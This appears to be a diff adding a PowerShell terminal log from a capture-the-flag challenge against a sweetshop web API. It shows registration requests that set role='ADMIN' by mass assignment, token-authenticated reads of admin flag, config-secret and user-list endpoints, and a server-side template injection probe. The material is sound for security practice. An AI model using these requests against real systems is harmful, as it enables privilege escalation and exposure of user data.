@@ -1,0 +1,66 @@
+PS C:\Users\Rakesh R K\Downloads\apoorv\sugar> $body = @{ username='massadmin1'; password='masspass1' } | ConvertTo-Json; try { Invoke-RestMethod -Uri 'http://chals1.apoorvctf.xyz:7001/api/login' -Method Post -ContentType 'application/json' -Body $body | ConvertTo-Json -Compress } catch { $_.Exception.Response.StatusCode.value__ ; $_.ErrorDetails.Message }
+{"role":"ADMIN","apiToken":"f5837a6a-431b-40a3-8740-8552d832510f","message":"Login successful","username":"massadmin1"}
+PS C:\Users\Rakesh R K\Downloads\apoorv\sugar> $body = @{ username='tokenadmin1'; password='tokenpass1'; email='token1@example.com'; apiToken='sweet'; role='ADMIN' } | ConvertTo-Json; try { Invoke-RestMethod -Uri 'http://chals1.apoorvctf.xyz:7001/api/register' -Method Post -ContentType 'application/json' -Body $body | ConvertTo-Json -Compress } catch
+ { $_.Exception.Response.StatusCode.value__ ; $_.ErrorDetails.Message }
+{"role":"ADMIN","message":"Registration successful","username":"tokenadmin1"}
+PS C:\Users\Rakesh R K\Downloads\apoorv\sugar> $body = @{ username='tokenadmin1'; password='tokenpass1' } | ConvertTo-Json; try { Invoke-RestMethod -Uri 'http://chals1.apoorvctf.xyz:7001/api/login' -Method Post -ContentType 'application/json' -Body $body | ConvertTo-Json -Compress } catch { $_.Exception.Response.StatusCode.value__ ; $_.ErrorDetails.Message }
+{"role":"ADMIN","apiToken":"eab99642-0e3b-4803-8fd2-a73473d89751","message":"Login successful","username":"tokenadmin1"}
+PS C:\Users\Rakesh R K\Downloads\apoorv\sugar> curl.exe -s -i http://chals1.apoorvctf.xyz:7001/api/admin/flag -H "X-Api-Token: f5837a6a-431b-40a3-8740-8552d832510f"
+HTTP/1.1 200 
+Vary: Origin
+Vary: Access-Control-Request-Method
+Vary: Access-Control-Request-Headers
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 0
+Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+Pragma: no-cache
+Expires: 0
+Content-Type: application/json
+Transfer-Encoding: chunked
+Date: Sat, 07 Mar 2026 18:12:19 GMT
+
+{"message":"Congratulations! You found the admin panel flag!","flag":"apoorvctf{y0u_f0und_th3_4dm1n_p4n3l}"}
+PS C:\Users\Rakesh R K\Downloads\apoorv\sugar> curl.exe -s -i http://chals1.apoorvctf.xyz:7001/api/admin/debug/config -H "X-Api-Token: f5837a6a-431b-40a3-8740-8552d832510f"
+HTTP/1.1 200 
+Vary: Origin
+Vary: Access-Control-Request-Method
+Vary: Access-Control-Request-Headers
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 0
+Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+Pragma: no-cache
+Expires: 0
+Content-Type: application/json
+Transfer-Encoding: chunked
+Date: Sat, 07 Mar 2026 18:12:19 GMT
+
+{"config":{"db_url":"jdbc:h2:mem:sweetshop","secret_key":"apoorvctf{d3bug_c0nf1g_l34k_but_st1ll_wr0ng}","version":"3.2.2"}}
+PS C:\Users\Rakesh R K\Downloads\apoorv\sugar> curl.exe -s -i http://chals1.apoorvctf.xyz:7001/api/admin/users -H "X-Api-Token: f5837a6a-431b-40a3-8740-8552d832510f"
+HTTP/1.1 200 
+Vary: Origin
+Vary: Access-Control-Request-Method
+Vary: Access-Control-Request-Headers
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 0
+Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+Pragma: no-cache
+Expires: 0
+Content-Type: application/json
+Transfer-Encoding: chunked
+Date: Sat, 07 Mar 2026 18:12:19 GMT
+
+{"users":[{"role":"ADMIN","id":1,"email":"admin@sweetshop.local","username":"sweetadmin"},{"role":"ADMIN","id":2,"email":"adm1nz@t.com","username":"adm1nz"},{"role":"ADMIN","id":3,"email":"oui@oui.com","username":"oui2"},{"role":"CUSTOMER","id":4,"email":"hacker@test.com","username":"hacker"},{"role":"ADMIN","id":5,"email":"dt1@test.com","username":"darktest1"},{"role":"CUSTOMER","id":6,"email":"test@major.com","username":"test"},{"role":"ADMIN","id":7,"email":"admin@test.com","username":"admin2"},{"role":"CUSTOMER","id":8,"email":"a@b.c","username":"testuser1"},{"role":"CUSTOMER","id":9,"email":"","username":"admin"},{"role":"ADMIN","id":10,"email":"sw@test.com","username":"sweetadmin12"},{"role":"CUSTOMER","id":11,"email":"user37583@a.com","username":"user37583"},{"role":"CUSTOMER","id":12,"email":"probe2@example.com","username":"probeuser2"},{"role":"CUSTOMER","id":13,"email":"u42287@a.com","username":"u42287"},{"role":"ADMIN","id":14,"email":"mass1@example.com","username":"massadmin1"},{"role":"ADMIN","id":15,"email":"token1@example.com","username":"tokenadmin1"}]}
+PS C:\Users\Rakesh R K\Downloads\apoorv\sugar> curl.exe -s -i -X POST http://chals1.apoorvctf.xyz:7001/api/admin/preview -H "Content-Type: application/json" -H "X-Api-Token: f5837a6a-431b-40a3-8740-8552d832510f" -d '{"template":"${7*7}"}'
+HTTP/1.1 403 
+Vary: Origin
+Vary: Access-Control-Request-Method
+Vary: Access-Control-Request-Headers
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 0
+Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+Pragma: no-cache
+Expires: 0
+Content-Length: 0
+Date: Sat, 07 Mar 2026 18:12:20 GMT
+
+PS C:\Users\Rakesh R K\Downloads\apoorv\sugar> 
